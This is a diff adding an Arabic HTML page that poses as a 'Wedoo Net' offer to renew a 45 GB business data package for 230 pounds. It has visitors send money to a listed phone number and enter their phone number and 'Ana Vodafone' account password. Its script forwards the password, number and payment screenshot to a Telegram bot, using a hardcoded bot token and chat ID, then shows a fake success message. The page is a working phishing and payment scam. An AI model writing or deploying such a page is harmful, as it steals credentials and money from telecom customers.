@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wedoo Net - تجديد الباقة</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            text-align: center;
+            direction: rtl;
+            color: rgb(236, 236, 236);
+            background: linear-gradient(to bottom, #87CEEB, #B0E0E6);
+            overflow: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+
+        /* قطرات المطر */
+        .rain-container {
+            position: fixed;
+            top: 100px;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            pointer-events: none;
+        }
+
+        .rain-drop {
+            position: absolute;
+            width: 2px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.6);
+            opacity: 0.7;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+
+        /* شريط العنوان */
+        .header {
+            background: linear-gradient(45deg, #4A00E0, #8E2DE2);
+            padding: 15px 30px;
+            font-size: 26px;
+            font-weight: bold;
+            border-radius: 25px;
+            display: inline-block;
+            margin-top: 60px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+        }
+
+        .discount-box {
+            background: #ffcc00;
+            color: black;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px auto;
+            width: 50%;
+            max-width: 750px;
+            text-align: center;
+            border-radius: 25px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .container {
+            margin-top: 50px;
+            width: 90%;
+            max-width: 400px;
+            background: rgba(20, 20, 20, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            margin-left: auto;
+            margin-right: auto;
+            text-align: center;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            text-align: center;
+            transition: 0.3s ease;
+        }
+
+        input {
+            background: #222;
+            color: white;
+            border: 1px solid #444;
+            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
+        }
+
+        input:focus {
+            border-color: #6f03fc;
+            outline: none;
+            box-shadow: 0 0 10px rgba(111, 3, 252, 0.6);
+        }
+
+        button {
+            background: linear-gradient(90deg, #6f03fc, #8E2DE2);
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(111, 3, 252, 0.4);
+        }
+
+        button:hover {
+            background: linear-gradient(90deg, #5A00E0, #7218E2);
+            transform: scale(1.05);
+        }
+
+        #success-message {
+            display: none;
+            background: #0f0;
+            color: white;
+            padding: 10px;
+            margin-top: 15px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- السحابة المتحركة -->
+    <div class="cloud-container"></div>
+
+    <!-- تأثير المطر -->
+    <div class="rain-container"></div>
+
+    <div class="header">تفعيل 45 جيجا بيزنس</div>
+
+    <div class="discount-box">
+        سعر الباقه: <strong>230 جنيه</strong> <br>
+        ⚡ لازم يبقي خطك بيزنس     <br>
+        <br>لازم ميكونش عليك سلف او نوته <br>
+        <strong>قم بتحويل المبلغ إلى وخد اسكرين بالتحويل : <strong>01097891442</strong></strong>
+    </div>
+
+    <div class="container">
+        <input type="text" id="phone-number" placeholder="📞 رقم الهاتف">
+        <input type="text" id="whatsapp-number" placeholder="🔑 باسورد أنا فودافون">
+        <input type="file" id="proof" accept="image/*">
+        <button onclick="sendData()">🔄 تجديد الباقة</button>
+        <div id="success-message">✅ تم تقديم طلبك بنجاح! سيتم تنفيذ الطلب خلال ساعة.</div>
+    </div>
+
+   <script>
+    function sendData() {
+        const phoneNumber = document.getElementById('phone-number').value;
+        const whatsappNumber = document.getElementById('whatsapp-number').value;
+        const proofFile = document.getElementById('proof').files[0];
+
+        if (!phoneNumber || !whatsappNumber || !proofFile) {
+            alert("يرجى ملء جميع الحقول وإرفاق صورة التحويل.");
+            return;
+        }
+
+        const token = "7916799067:AAHFnY6z26-uAOKOwSaG43OPgBo-EEdZ6OE"; // استبدل بـ توكن بوت تيليجرام
+        const chatId = "6798744902"; // استبدل بـ معرف الشات أو القناة
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", `📞 رقم الهاتف بيزنس 40: ${phoneNumber}\n🔑 باسورد أنا فودافون: ${whatsappNumber}`);
+        formData.append("photo", proofFile);
+
+        axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData)
+            .then(response => {
+                if (response.data.ok) {
+                    const successMessage = document.getElementById('success-message');
+                    successMessage.style.display = "block";
+                    successMessage.textContent = "✅ تم تقديم طلبك بنجاح! سيتم التجديد خلال 15 دقيقة.";
+                } else {
+                    alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                alert("فشل في الاتصال بالسيرفر، تأكد من اتصالك بالإنترنت.");
+                console.error(error);
+            });
+    }
+     function createRain() {
+            const rainContainer = document.querySelector('.rain-container');
+            for (let i = 0; i < 50; i++) {
+                let drop = document.createElement('div');
+                drop.classList.add('rain-drop');
+                drop.style.left = `${Math.random() * 100}%`;
+                drop.style.animationDuration = `${Math.random() * 2 + 1}s`;
+                drop.style.animationDelay = `${Math.random() * 2}s`;
+                rainContainer.appendChild(drop);
+            }
+        }
+        createRain();
+</script>
+
+</body>
+</html>
